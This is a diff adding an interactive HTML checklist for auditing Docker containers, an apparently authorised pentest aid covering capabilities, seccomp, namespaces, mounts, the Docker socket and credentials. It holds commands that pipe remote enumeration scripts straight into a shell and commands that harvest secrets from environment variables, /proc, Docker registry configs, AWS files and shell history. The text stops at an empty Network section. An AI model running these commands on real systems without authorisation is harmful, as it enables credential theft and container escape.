@@ -1,0 +1,1322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Docker Audit Checklist</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#ffffff;--bg2:#f7f7f5;--bg3:#f0efe9;
+  --border:rgba(0,0,0,0.11);--border2:rgba(0,0,0,0.20);
+  --text:#1a1a18;--text2:#5a5a56;--text3:#8a8a84;
+  --mono:'Fira Mono','Cascadia Code','Consolas',monospace;
+  --sans:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
+  --green:#1D9E75;--green-bg:#e1f5ee;
+  --purple-bg:#EEEDFE;--purple-text:#3C3489;
+  --amber-bg:#FAEEDA;--amber-text:#854F0B;
+  --blue-bg:#E6F1FB;--blue-text:#185FA5;
+}
+@media(prefers-color-scheme:dark){
+  :root{
+    --bg:#1c1c1a;--bg2:#252522;--bg3:#2e2e2b;
+    --border:rgba(255,255,255,0.09);--border2:rgba(255,255,255,0.18);
+    --text:#e8e6df;--text2:#a8a69f;--text3:#6a6a64;
+    --green-bg:#04342C;
+    --purple-bg:#26215C;--purple-text:#CECBF6;
+    --amber-bg:#2e2010;--amber-text:#fac775;
+    --blue-bg:#0e1e30;--blue-text:#85b7eb;
+  }
+}
+body{font-family:var(--sans);background:var(--bg);color:var(--text);font-size:14px;line-height:1.6}
+.page{max-width:860px;margin:0 auto;padding:32px 20px 120px}
+h1{font-size:19px;font-weight:600;margin-bottom:3px}
+.sub{font-size:12px;color:var(--text3);margin-bottom:20px}
+
+/* tools strip header */
+.tools-strip{background:var(--bg2);border:0.5px solid var(--border2);border-radius:8px;padding:14px 16px;margin-bottom:22px}
+.tools-strip h2{font-size:11px;font-weight:600;color:var(--text3);text-transform:uppercase;letter-spacing:.07em;margin-bottom:10px}
+.tools-grid{display:flex;flex-direction:column;gap:7px}
+.tool-row{display:flex;align-items:baseline;gap:8px;flex-wrap:wrap}
+.tool-name{font-size:12px;font-weight:600;color:var(--text);min-width:80px;flex-shrink:0}
+.tool-desc{font-size:12px;color:var(--text2)}
+.tool-url{font-size:11px;color:var(--text3);font-family:var(--mono);word-break:break-all;padding-left:2px}
+.tool-tag{display:inline-block;font-size:10px;padding:1px 7px;border-radius:9px;font-weight:500;background:var(--purple-bg);color:var(--purple-text);margin-left:4px;vertical-align:middle}
+
+/* progress + toolbar */
+.summary{display:flex;gap:10px;margin-bottom:18px;align-items:center;flex-wrap:wrap}
+.prog-wrap{flex:1;min-width:160px}
+.prog-bar{height:4px;background:var(--border2);border-radius:2px;overflow:hidden;margin-bottom:4px}
+.prog-fill{height:4px;background:var(--green);border-radius:2px;transition:width .3s}
+.prog-lbl{font-size:11px;color:var(--text3)}
+.tbtn{font-size:11px;padding:5px 13px;border-radius:7px;border:0.5px solid var(--border2);background:transparent;color:var(--text2);cursor:pointer;font-family:var(--sans);white-space:nowrap}
+.tbtn:hover{background:var(--bg2)}
+.tbtn-danger{border-color:#A32D2D;color:#A32D2D}
+.tbtn-danger:hover{background:var(--bg2)}
+
+/* section headers */
+.section-hdr{font-size:11px;font-weight:600;color:var(--text3);text-transform:uppercase;letter-spacing:.07em;padding:20px 0 6px;border-bottom:0.5px solid var(--border);margin-bottom:2px}
+
+/* step / tool-step shared layout */
+.step{display:flex;gap:10px;align-items:flex-start;padding:10px 0;border-bottom:0.5px solid var(--border)}
+.step.done .stitle{text-decoration:line-through;color:var(--text3)}
+.step-cb{width:16px;height:16px;min-width:16px;border-radius:4px;border:1.5px solid var(--border2);cursor:pointer;margin-top:3px;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all .12s}
+.step-cb:hover{border-color:var(--green)}
+.step-cb.on{background:var(--green);border-color:var(--green)}
+.step-cb.on::after{content:'';display:block;width:3px;height:6px;border:2px solid #fff;border-top:none;border-left:none;transform:rotate(45deg) translateY(-1px)}
+.num{font-size:11px;color:var(--text3);min-width:22px;margin-top:3px;font-variant-numeric:tabular-nums;flex-shrink:0}
+.body{flex:1;min-width:0}
+.stitle{font-size:13px;font-weight:500;cursor:pointer;margin-bottom:3px}
+.stitle:hover{color:var(--green)}
+.why-text{font-size:12px;color:var(--text3);font-style:italic;margin-bottom:4px;line-height:1.5}
+.look{font-size:12px;color:var(--text2);margin-bottom:6px;line-height:1.5}
+
+/* root badge */
+.root-badge{display:inline-block;font-size:10px;padding:1px 7px;border-radius:9px;font-weight:500;background:var(--amber-bg);color:var(--amber-text);margin-left:6px;vertical-align:middle}
+.low-badge{display:inline-block;font-size:10px;padding:1px 7px;border-radius:9px;font-weight:500;background:var(--blue-bg);color:var(--blue-text);margin-left:6px;vertical-align:middle}
+
+/* commands */
+.cmds{display:flex;flex-direction:column;gap:3px;margin-bottom:8px}
+.cmd-row{display:flex;gap:6px;align-items:flex-start}
+.cmd-cb{width:13px;height:13px;min-width:13px;border-radius:3px;border:1.5px solid var(--border2);cursor:pointer;margin-top:3px;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all .12s}
+.cmd-cb:hover{border-color:var(--green)}
+.cmd-cb.on{background:var(--green);border-color:var(--green)}
+.cmd-cb.on::after{content:'';display:block;width:2px;height:5px;border:1.5px solid #fff;border-top:none;border-left:none;transform:rotate(45deg) translateY(-1px)}
+.code{flex:1;font-family:var(--mono);font-size:11px;background:var(--bg3);border:0.5px solid var(--border);border-radius:5px;padding:5px 9px;line-height:1.6;word-break:break-all;white-space:pre-wrap;overflow-wrap:anywhere;color:var(--text);display:block}
+.code.cmd-done{opacity:0.5;text-decoration:line-through}
+.cmt{font-size:11px;color:var(--text3);font-style:italic;padding:2px 0 1px 19px}
+.cpbtn{font-size:10px;padding:4px 9px;border-radius:5px;border:0.5px solid var(--border2);background:transparent;color:var(--text2);cursor:pointer;font-family:var(--sans);white-space:nowrap;flex-shrink:0;margin-top:1px}
+.cpbtn:hover{background:var(--bg2)}
+.cpbtn.ok{color:var(--green);border-color:var(--green)}
+
+/* output fields */
+.out-wrap{display:flex;flex-direction:column;gap:6px;margin-top:2px}
+.out-block{display:flex;flex-direction:column;gap:3px}
+.out-label{font-size:10px;font-weight:600;color:var(--text3);text-transform:uppercase;letter-spacing:.05em}
+.output-field{
+  width:100%;font-family:var(--mono);font-size:11px;
+  background:var(--bg2);border:0.5px solid var(--border2);border-radius:5px;
+  padding:7px 9px;color:var(--text);resize:vertical;min-height:54px;
+  line-height:1.6;outline:none;transition:border-color .15s;
+}
+.output-field:focus{border-color:var(--green)}
+.output-field::placeholder{color:var(--text3)}
+
+/* export / import bar */
+.action-bar{position:sticky;bottom:0;background:var(--bg);border-top:0.5px solid var(--border2);padding:12px 0;margin-top:24px;display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+.export-btn{font-size:12px;font-weight:500;padding:7px 16px;border-radius:7px;border:0.5px solid var(--green);background:var(--green-bg);color:var(--green);cursor:pointer;font-family:var(--sans);white-space:nowrap;transition:all .15s}
+.export-btn:hover{background:var(--green);color:#fff}
+.import-btn{font-size:12px;font-weight:500;padding:7px 16px;border-radius:7px;border:0.5px solid var(--border2);background:transparent;color:var(--text2);cursor:pointer;font-family:var(--sans);white-space:nowrap}
+.import-btn:hover{background:var(--bg2)}
+.bar-note{font-size:11px;color:var(--text3);margin-left:4px}
+#import-input{display:none}
+
+@media print{
+  .action-bar,.cpbtn,.step-cb,.cmd-cb,.tbtn,.cmd-cb,.out-label button{display:none!important}
+  .step{break-inside:avoid}
+  .page{padding:16px;max-width:100%}
+  .output-field{border:0.5px solid #ccc;min-height:40px;resize:none}
+  .section-hdr{padding-top:12px}
+  h1{font-size:16px}
+  .tools-strip{border:0.5px solid #ccc}
+  a{color:inherit;text-decoration:none}
+}
+</style>
+</head>
+<body>
+<div class="page">
+
+  <h1>Docker Audit Checklist</h1>
+  <div class="sub">Steps in execution order. Check off as you go. Per-command checkboxes track individual execution. Output fields save automatically. Export to Markdown when done.</div>
+
+  <div class="tools-strip">
+    <h2>Tools</h2>
+    <div class="tools-grid">
+      <div class="tool-row">
+        <span class="tool-name">LinPEAS</span>
+        <span class="tool-desc">Broadest automated sweep — capabilities, env vars, mounts, SUID, creds, kernel version.</span>
+        <span class="tool-tag">First drop</span>
+      </div>
+      <div class="tool-url">https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh</div>
+      <div class="tool-row">
+        <span class="tool-name">DEEPCE</span>
+        <span class="tool-desc">Focused container escape enumeration — socket, privileged mode, caps, sensitive mounts, escape PoC checks.</span>
+      </div>
+      <div class="tool-url">https://github.com/stealthcopter/deepce</div>
+      <div class="tool-row">
+        <span class="tool-name">CDK</span>
+        <span class="tool-desc">Auto-evaluates all exploit preconditions — caps, mounts, network, available escape vectors.</span>
+      </div>
+      <div class="tool-url">https://github.com/cdk-team/CDK</div>
+      <div class="tool-row">
+        <span class="tool-name">pspy</span>
+        <span class="tool-desc">Unprivileged process monitor — captures cronjobs, scripts, and commands run by other users/root without needing root access.</span>
+      </div>
+      <div class="tool-url">https://github.com/DominicBreuker/pspy</div>
+      <div class="tool-row">
+        <span class="tool-name">Lynis</span>
+        <span class="tool-desc">System security auditing and hardening tool — scans the host for misconfigurations, weak settings, and security findings across 300+ checks.</span>
+      </div>
+      <div class="tool-url">https://github.com/CISOfy/lynis</div>
+    </div>
+  </div>
+
+  <div class="summary">
+    <div class="prog-wrap">
+      <div class="prog-bar"><div class="prog-fill" id="pf" style="width:0%"></div></div>
+      <div class="prog-lbl" id="pl">0 / 0 complete</div>
+    </div>
+    <button class="tbtn" onclick="resetAll()" id="reset-btn">Reset</button>
+  </div>
+
+  <div id="list"></div>
+
+  <div id="refs-section" style="margin-top:32px;padding-top:20px;border-top:0.5px solid var(--border2)">
+    <div style="font-size:11px;font-weight:600;color:var(--text3);text-transform:uppercase;letter-spacing:.07em;margin-bottom:12px">References</div>
+    <div id="refs-list"></div>
+  </div>
+
+  <div class="action-bar">
+    <button class="export-btn" onclick="exportMd()">Export to Markdown</button>
+    <button class="export-btn" onclick="exportPdf()" style="background:var(--bg2);border-color:var(--border2);color:var(--text2)">Export to PDF</button>
+    <label style="display:flex;align-items:center;gap:7px;cursor:pointer;font-size:12px;color:var(--text2);user-select:none">
+      <div id="redact-track" onclick="toggleRedact()" style="position:relative;width:32px;height:18px;background:var(--green);border-radius:9px;transition:background .2s;flex-shrink:0;cursor:pointer">
+        <span id="redact-thumb" style="position:absolute;top:2px;left:14px;width:14px;height:14px;background:#fff;border-radius:50%;transition:left .2s"></span>
+      </div>
+      Redact credentials on export
+    </label>
+    <button class="import-btn" onclick="document.getElementById('import-input').click()">Import Markdown</button>
+    <input type="file" id="import-input" accept=".md,text/markdown,text/plain" onchange="importMd(event)">
+    <span class="bar-note">Progress is auto-saved in browser on every change.</span>
+  </div>
+
+</div>
+<script>
+// ── Data ───────────────────────────────────────────────
+// root: 'both' = run as both low-priv and root (separate output fields)
+//        'root' = only useful as root
+//        'low'  = works fine as low-priv (single output field)
+const TOOLS_DATA = [
+{section:"Tool Runs"},
+{tid:"t1", title:"LinPEAS",
+why:"LinPEAS is your broadest automated sweep. It detects container context automatically and highlights capabilities, environment variables, sensitive mounts, SUID binaries, and kernel CVEs. Run it first as your current user, then again as root if you escalate — the output differs significantly.",
+root:"both",
+cmds:[
+  {c:"curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh 2>/dev/null | tee /tmp/linpeas.out"},
+  {c:"wget -q -O /tmp/lp.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh 2>/dev/null | tee /tmp/linpeas.out"},
+  {c:"cat /tmp/linpeas.out | grep -A2 'Capabilities\\|docker.sock\\|SUID\\|Interesting ENV\\|password\\|token\\|secret'"}
+]},
+{tid:"t2", title:"DEEPCE",
+why:"DEEPCE focuses specifically on container escape preconditions. It checks the Docker socket, privileged flag, dangerous capabilities, sensitive mounts, and environment variables, flagging viable escape paths with [+] markers. Run first as your current user to establish baseline findings, then re-run as root — with elevated access DEEPCE can read restricted cgroup paths, execute escape PoCs that require mount syscalls, and reach files invisible to low-priv users.",
+root:"both",
+cmds:[
+  {c:"curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o /tmp/deepce.sh && chmod +x /tmp/deepce.sh"},
+  {c:"/tmp/deepce.sh --no-color 2>/dev/null | tee /tmp/deepce.out"},
+  {c:"cat /tmp/deepce.out | grep -E '\\[\\+\\]|\\[!\\]' | head -30"}
+]},
+{tid:"t3", title:"CDK",
+why:"CDK evaluates all exploit preconditions in one pass — capabilities, mounts, network vectors, and available escape modules. The evaluate --full output lists everything exploitable. Run as your current user; escalate and re-run if you gain root.",
+root:"both",
+cmds:[
+  {c:"curl -sL https://github.com/cdk-team/CDK/releases/latest/download/cdk_linux_amd64 -o /tmp/cdk && chmod +x /tmp/cdk"},
+  {c:"/tmp/cdk evaluate --full 2>/dev/null | tee /tmp/cdk.out"},
+  {c:"cat /tmp/cdk.out | grep -iE 'exploit|escape|privileged|socket|token|writable'"}
+]},
+{tid:"t4", title:"pspy",
+why:"pspy monitors process activity without needing root access, making it useful as a low-priv user. However running it as root reveals significantly more — kernel threads, system-level daemons, PID 1 activity, and processes that filter themselves from unprivileged observers. Run first as low-priv to see what is visible, then re-run as root to get the full picture. Let each run collect for at least 2–3 minutes.",
+root:"both",
+cmds:[
+  {c:"curl -sL https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o /tmp/pspy && chmod +x /tmp/pspy"},
+  {c:"/tmp/pspy -pf -i 1000 2>/dev/null | tee /tmp/pspy.out"},
+  {c:"cat /tmp/pspy.out | grep -iE 'root|uid=0|cron|sh -c|python|bash' | head -40"}
+]},
+{tid:"t5", title:"Lynis",
+why:"Lynis is a host-level security auditing tool that performs over 300 checks covering kernel hardening, authentication, file permissions, network settings, and installed software. In a container context it audits the container's OS layer. Run as low-priv first to see what an unprivileged attacker observes. Run as root to get the full audit including privileged checks that are skipped otherwise. The --pentest flag skips checks that require interactive confirmation and adjusts output for offensive use rather than compliance reporting.",
+root:"both",
+cmds:[
+  {c:"curl -sL https://github.com/CISOfy/lynis/archive/refs/heads/master.tar.gz | tar xz -C /tmp && mv /tmp/lynis-master /tmp/lynis"},
+  {comment:"Standard audit — full system scan"},
+  {c:"/tmp/lynis/lynis audit system 2>/dev/null | tee /tmp/lynis.out"},
+  {comment:"Pentest mode — skips interactive prompts, tuned for offensive use"},
+  {c:"/tmp/lynis/lynis audit system --pentest 2>/dev/null | tee /tmp/lynis_pentest.out"},
+  {c:"cat /tmp/lynis.out | grep -iE 'warning|suggestion|\\[!\\]|\\[W\\]' | head -40"}
+]},
+];
+
+const DATA = [
+
+{section:"Capabilities"},
+
+{id:1, root:"low",
+title:"Decode effective capability set",
+why:"Linux capabilities divide root privileges into fine-grained units. Docker drops many by default but misconfigurations or deliberate overrides can leave dangerous ones in place. This is the single most important check to run first — it determines which escape techniques are applicable.",
+look:"Look for: SYS_ADMIN = cgroup escape viable. SYS_PTRACE = process injection. SYS_MODULE = kernel module load. NET_ADMIN = iptables / ARP. Full bitmask (all f's) = --privileged.",
+cmds:[
+  {c:"cat /proc/self/status | grep -i cap"},
+  {c:"capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}') 2>/dev/null"}
+]},
+
+{id:2, root:"low",
+title:"Confirm --privileged via block device access",
+why:"The --privileged flag grants the container all capabilities and access to all host devices, completely bypassing the Docker isolation model. Block device visibility is the most reliable indicator because it cannot be faked from a non-privileged context.",
+look:"Look for: fdisk -l succeeding = block device access = --privileged confirmed. Escape paths E1 (cgroup) and E2 (disk mount) are both viable.",
+cmds:[
+  {c:"fdisk -l 2>/dev/null && echo '[+] --privileged confirmed'"},
+  {c:"ls /dev/sd* /dev/nvme* /dev/xvd* /dev/vd* 2>/dev/null"},
+  {c:"ls -la /dev/ | grep '^b' | head -10"}
+]},
+
+{id:3, root:"low",
+title:"Check no-new-privileges flag",
+why:"Without --security-opt no-new-privileges a process inside a container can gain additional privileges via SUID/SGID binaries. Its absence means any SUID binary found later is directly exploitable for escalation inside the container.",
+look:"Look for: NoNewPrivs: 0 = SUID/SGID binaries inside the container can escalate privileges.",
+cmds:[
+  {c:"cat /proc/self/status | grep NoNewPrivs"}
+]},
+
+{id:4, root:"low",
+title:"Check user namespace remapping",
+why:"By default UID 0 inside a container maps directly to UID 0 on the host. User namespace remapping offsets this so container root maps to an unprivileged host UID. Without remapping any container escape immediately yields host root.",
+look:"Look for: uid_map '0 0 4294967295' = no userns-remap = container root is host root. If remapped the first column shows an offset.",
+cmds:[
+  {c:"cat /proc/self/uid_map"},
+  {c:"cat /proc/self/gid_map"},
+  {c:"id"}
+]},
+
+{section:"Seccomp & MAC"},
+
+{id:5, root:"low",
+title:"Check seccomp profile",
+why:"Seccomp filters which syscalls a container process may make. Docker applies a default profile blocking roughly 44 dangerous syscalls. If disabled — explicitly or because the daemon lacks it — syscalls like mount, unshare, and ptrace become available, directly enabling most escape techniques.",
+look:"Look for: Seccomp: 0 = disabled = all syscalls available. 'unconfined' in /proc/self/attr/current = no AppArmor either. unshare succeeding = no filtering on namespace creation.",
+cmds:[
+  {c:"grep Seccomp /proc/self/status"},
+  {c:"cat /proc/self/attr/current 2>/dev/null"},
+  {c:"unshare --user 2>/dev/null && echo '[+] unshare allowed = no seccomp' || echo '[-] unshare blocked'"}
+]},
+
+{id:6, root:"low",
+title:"Check AppArmor profile",
+why:"AppArmor is a MAC system that restricts what files, capabilities, and syscalls a container process can use, independently of Linux capabilities. Docker ships a default AppArmor profile. If absent or unconfined the container has no MAC enforcement.",
+look:"Look for: 'unconfined' = no AppArmor profile applied. Combined with Seccomp: 0 = zero MAC layer on this container.",
+cmds:[
+  {c:"cat /proc/self/attr/current 2>/dev/null"},
+  {c:"cat /sys/module/apparmor/parameters/enabled 2>/dev/null"},
+  {c:"aa-status 2>/dev/null | head -5"}
+]},
+
+{id:7, root:"low",
+title:"Check SELinux status",
+why:"SELinux provides mandatory access control at the kernel level. Permissive mode logs violations but does not block them, offering no real protection. Worth documenting as part of the overall MAC picture.",
+look:"Look for: 'Permissive' = SELinux logs but does not block. 'Disabled' = no SELinux enforcement at all.",
+cmds:[
+  {c:"sestatus 2>/dev/null"},
+  {c:"getenforce 2>/dev/null"}
+]},
+
+{section:"Namespace Isolation"},
+
+{id:8, root:"low",
+title:"Check PID namespace isolation",
+why:"When --pid=host is set the container shares the host's PID namespace and can see and interact with every process on the host. This enables reading credentials from /proc/<pid>/environ of host processes and ptrace injection against host processes.",
+look:"Look for: Same ns inode as PID 1 = --pid=host = all host processes visible. /proc/1/exe pointing to systemd or init = confirmed host PID namespace.",
+cmds:[
+  {c:"readlink /proc/1/ns/pid /proc/self/ns/pid 2>/dev/null"},
+  {c:"[ \"$(readlink /proc/1/ns/pid 2>/dev/null)\" = \"$(readlink /proc/self/ns/pid 2>/dev/null)\" ] && echo '[+] Host PID ns shared' || echo '[-] PID ns isolated'"},
+  {c:"ls -la /proc/1/exe 2>/dev/null"},
+  {c:"cat /proc/1/cmdline 2>/dev/null | tr '\\0' ' '"}
+]},
+
+{id:9, root:"low",
+title:"Check network namespace isolation",
+why:"With --network=host the container shares the host's network stack — all interfaces, all listening services, all routing tables. This gives direct access to services only bound to localhost on the host.",
+look:"Look for: Same net ns inode as PID 1 = --network=host = full host network stack accessible from inside the container.",
+cmds:[
+  {c:"readlink /proc/1/ns/net /proc/self/ns/net 2>/dev/null"},
+  {c:"[ \"$(readlink /proc/1/ns/net 2>/dev/null)\" = \"$(readlink /proc/self/ns/net 2>/dev/null)\" ] && echo '[+] Host net ns shared' || echo '[-] Net ns isolated'"}
+]},
+
+{id:10, root:"low",
+title:"Check IPC namespace isolation",
+why:"With --ipc=host the container shares the host's IPC namespace, giving access to shared memory segments, message queues, and semaphores used by host processes. This can be leveraged to tamper with or read data from host applications.",
+look:"Look for: Same IPC ns inode as PID 1 = --ipc=host = host shared memory segments accessible.",
+cmds:[
+  {c:"readlink /proc/1/ns/ipc /proc/self/ns/ipc 2>/dev/null"},
+  {c:"[ \"$(readlink /proc/1/ns/ipc 2>/dev/null)\" = \"$(readlink /proc/self/ns/ipc 2>/dev/null)\" ] && echo '[+] Host IPC ns shared' || echo '[-] IPC ns isolated'"},
+  {c:"ipcs -a 2>/dev/null | head -8"}
+]},
+
+{section:"Mounts"},
+
+{id:11, root:"low",
+title:"Enumerate all mounts",
+why:"Bind mounts are the most common misconfiguration in real-world Docker deployments. Any sensitive host path mounted into the container is a direct bridge to the host, bypassing all namespace isolation.",
+look:"Look for: Host / /etc /root mounted = direct host compromise path. /proc from host = process namespace leak. /sys/fs/cgroup writable = cgroup escape vector.",
+cmds:[
+  {c:"cat /proc/mounts"},
+  {c:"mount 2>/dev/null | grep -vE 'proc|sysfs|devpts|cgroup|tmpfs|mqueue|shm' | head -20"},
+  {c:"cat /proc/self/mountinfo | grep -vE 'proc|sys|dev|cgroup|tmpfs' | head -20"}
+]},
+
+{id:12, root:"low",
+title:"Find Docker socket",
+why:"The Docker socket is equivalent to unauthenticated root access to the host. Any process that can write to it can spawn privileged containers with the host root filesystem mounted. Mounting it into a container is a common pattern for CI/CD agents.",
+look:"Look for: Socket present + writable = host root via Docker API. Group 'docker' = socket accessible even without a direct bind mount.",
+cmds:[
+  {c:"find / -name 'docker.sock' -o -name 'containerd.sock' 2>/dev/null"},
+  {c:"ls -la /var/run/docker.sock /run/docker.sock 2>/dev/null"},
+  {c:"[ -w /var/run/docker.sock ] && echo '[+] Socket WRITABLE' || echo '[-] Not writable'"},
+  {c:"id | grep -o 'docker' && echo '[+] In docker group'"},
+  {c:"curl -s --unix-socket /var/run/docker.sock http://localhost/version 2>/dev/null | head -3"}
+]},
+
+{id:13, root:"low",
+title:"Check shadow group membership misconfiguration",
+why:"A user can be listed in /etc/gshadow for a privileged group such as docker without appearing in /etc/group. Standard enumeration via id will not reveal this. The sg and newgrp commands honour gshadow, allowing the user to activate the group and gain Docker socket access.",
+look:"Look for: User present in /etc/gshadow for docker/sudo/disk but absent from /etc/group. sg docker -c 'id' succeeding = group activated = Docker socket accessible.",
+cmds:[
+  {comment:"Check what /etc/group and /etc/gshadow say — they may differ"},
+  {c:"id"},
+  {c:"cat /etc/group | grep -iE 'docker|sudo|wheel|shadow|disk'"},
+  {c:"cat /etc/gshadow 2>/dev/null | grep -iE 'docker|sudo|wheel|shadow|disk'"},
+  {comment:"If your user appears in gshadow but not group, try activating the group"},
+  {c:"sg docker -c \"id\" 2>/dev/null"},
+  {c:"newgrp docker 2>/dev/null"},
+  {c:"sg docker -c \"curl -s --unix-socket /var/run/docker.sock http://localhost/version\" 2>/dev/null"}
+]},
+
+{id:14, root:"both",
+title:"Check /sys/fs/cgroup writability",
+why:"The Linux cgroup subsystem exposes a release_agent file that the kernel executes with root privileges when the last process in a cgroup exits. With SYS_ADMIN or --privileged a container can write to this file to execute arbitrary code on the host as root.",
+look:"Look for: Writable release_agent files = cgroup escape precondition confirmed. Required for escape E1. Root access reveals more writable paths than low-priv.",
+cmds:[
+  {c:"ls /sys/fs/cgroup/ 2>/dev/null"},
+  {c:"find /sys/fs/cgroup -name 'release_agent' 2>/dev/null"},
+  {c:"find /sys/fs/cgroup -writable -type f 2>/dev/null | head -10"}
+]},
+
+{id:15, root:"low",
+title:"Check read-only root filesystem",
+why:"If the container's root filesystem is writable an attacker can modify application binaries, drop scripts, or plant backdoors. A read-only root filesystem forces writes through explicitly defined volumes, limiting persistence options.",
+look:"Look for: touch /test succeeds = filesystem is writable = in-container persistence and binary tampering are possible.",
+cmds:[
+  {c:"touch /test_rw 2>/dev/null && echo '[+] Root filesystem WRITABLE' && rm /test_rw || echo '[-] Root filesystem read-only'"},
+  {c:"mount | grep 'on / ' | grep -o '(.*)'"},
+  {c:"cat /proc/mounts | grep ' / ' | awk '{print $4}' | tr ',' '\\n' | grep -E '^ro$|^rw$'"}
+]},
+
+{id:16, root:"both",
+title:"Check resource limits",
+why:"Without CPU, memory, and PID limits a compromised container can exhaust host resources. Missing --pids-limit allows a fork bomb from inside the container to crash the host. Root access can reveal cgroup v2 limits not visible to low-priv users.",
+look:"Look for: No memory/CPU/PID limits set = container can consume all host resources. -1 or unlimited PIDs = fork bomb possible.",
+cmds:[
+  {c:"cat /sys/fs/cgroup/memory/memory.limit_in_bytes 2>/dev/null || cat /sys/fs/cgroup/memory.max 2>/dev/null"},
+  {c:"cat /sys/fs/cgroup/cpu/cpu.cfs_quota_us 2>/dev/null || cat /sys/fs/cgroup/cpu.max 2>/dev/null"},
+  {c:"cat /sys/fs/cgroup/pids/pids.max 2>/dev/null || cat /sys/fs/cgroup/pids.max 2>/dev/null"},
+  {c:"cat /proc/self/limits | grep -iE 'processes|open files'"}
+]},
+
+{id:17, root:"both",
+title:"Hunt for sensitive files in mounted paths",
+why:"Developers routinely mount configuration directories and secret stores into containers. These often contain private keys, API tokens, and database credentials. World-writable files in sensitive paths are also a persistence vector. Root access uncovers files with restrictive permissions invisible to low-priv.",
+look:"Look for: Private keys, .env files, .git directories (check git log for secrets in history), world-writable files in sensitive paths.",
+cmds:[
+  {c:"find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' -o -name '.env' -o -name 'credentials' 2>/dev/null | grep -vE '^/proc|^/sys' | head -20"},
+  {c:"find /app /srv /data /opt /config /home /root -name '*.conf' -o -name '*.yaml' -o -name '*.json' 2>/dev/null | xargs grep -liE 'password|secret|token' 2>/dev/null | head -10"},
+  {c:"find / -name '.git' -type d 2>/dev/null | grep -vE '^/proc|^/sys' | head -5"},
+  {c:"find / -perm -o+w -not -path '/proc/*' -not -path '/sys/*' -not -path '/dev/*' -type f 2>/dev/null | head -20"}
+]},
+
+{section:"Environment & Credentials"},
+
+{id:18, root:"both",
+title:"Dump all environment variables",
+why:"Environment variables are the primary credential injection mechanism in containerised environments. Database URLs, API keys, cloud access keys, and JWT secrets are routinely passed this way. Root may reveal additional variables set in daemon configuration not visible to the container process.",
+look:"Look for: *_PASSWORD *_SECRET *_TOKEN AWS_SECRET_ACCESS_KEY DATABASE_URL GITHUB_TOKEN. Document every value found.",
+cmds:[
+  {c:"env 2>/dev/null | sort"},
+  {c:"cat /proc/self/environ 2>/dev/null | tr '\\0' '\\n'"},
+  {c:"env | grep -iE 'pass|secret|key|token|api|aws|azure|gcp|auth|cred|db_|mysql|mongo|redis|jwt'"}
+]},
+
+{id:19, root:"root",
+title:"Check other process environments",
+why:"If the host PID namespace is shared, /proc exposes the environment variables of every process on the host. This requires at minimum access to other processes' /proc entries, which on a real host PID namespace is readable only by root or the process owner.",
+look:"Look for: DB connection strings, cloud keys, session tokens in argv or environ of other processes. Only accessible if --pid=host (step 8). Requires root or host PID namespace.",
+cmds:[
+  {c:"cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'pass|secret|token|key|aws|api' | sort -u | head -40"},
+  {c:"cat /proc/*/cmdline 2>/dev/null | tr '\\0' ' ' | grep -iE 'pass|secret|token|key|auth' | head -20"}
+]},
+
+{id:20, root:"both",
+title:"Hunt cloud credentials and Docker registry auth",
+why:"Docker config.json stores base64-encoded registry credentials. AWS credential files, kubeconfig tokens, and mounted secrets are frequently accessible inside containers. Root access reveals files in /root/.docker and system-level credential stores.",
+look:"Look for: config.json auths = base64 'user:password' per registry. AWS credentials file = cloud API access. Decode auth blobs — they are plaintext after base64.",
+cmds:[
+  {c:"cat ~/.docker/config.json /root/.docker/config.json 2>/dev/null"},
+  {c:"python3 -c \"import json,base64; d=json.load(open('/root/.docker/config.json')); [print(k, base64.b64decode(v.get('auth','')).decode()) for k,v in d.get('auths',{}).items()]\" 2>/dev/null"},
+  {c:"find / -path '*/.aws/credentials' -o -path '*/.aws/config' 2>/dev/null | xargs cat 2>/dev/null"},
+  {c:"find /var/run/secrets /run/secrets /secrets 2>/dev/null -type f | xargs cat 2>/dev/null | head -30"}
+]},
+
+{id:21, root:"low",
+title:"Check shell history",
+why:"Shell history captures every command a user or operator has run inside the container. Developers often run database CLIs or curl commands with auth headers, leaving a plaintext credential trail.",
+look:"Look for: curl with -u or -H Authorization, database CLI with -p, docker run -e with secrets, any plaintext credential on the command line.",
+cmds:[
+  {c:"cat ~/.bash_history /root/.bash_history ~/.zsh_history 2>/dev/null | grep -iE 'pass|token|secret|curl.*-[uH]|mysql|psql|mongo' | head -30"}
+]},
+
+{id:22, root:"both",
+title:"Check SUID and SGID binaries",
+why:"SUID binaries execute with the file owner's privileges regardless of who runs them. If unexpected SUID binaries exist — particularly interpreters or file-access tools — they can spawn a privileged shell. Running as root reveals any SUID binaries in paths the low-priv user cannot list.",
+look:"Look for: Unexpected SUID binaries — python, perl, find, vim, bash, cp, tar, nmap, curl. Cross-reference every result with GTFObins.",
+cmds:[
+  {c:"find / -perm -4000 -type f 2>/dev/null | grep -vE '^/proc|^/sys'"},
+  {c:"find / -perm -2000 -type f 2>/dev/null | grep -vE '^/proc|^/sys'"}
+]},
+
+{id:23, root:"low",
+title:"Check docker exec sudo privilege",
+why:"If sudo is configured without a password requirement for docker exec or docker commands in general, this is an immediate host root path. The sudo policy is user-specific and must be checked as the current low-priv user.",
+look:"Look for: NOPASSWD entries for docker in sudoers. sudo -l showing docker or docker exec without password = instant host root.",
+cmds:[
+  {c:"sudo -l 2>/dev/null"},
+  {c:"cat /etc/sudoers 2>/dev/null | grep -iE 'docker|NOPASSWD'"},
+  {c:"find /etc/sudoers.d/ -type f 2>/dev/null | xargs cat 2>/dev/null | grep -iE 'docker|NOPASSWD'"}
+]},
+
+{section:"Network"},
+
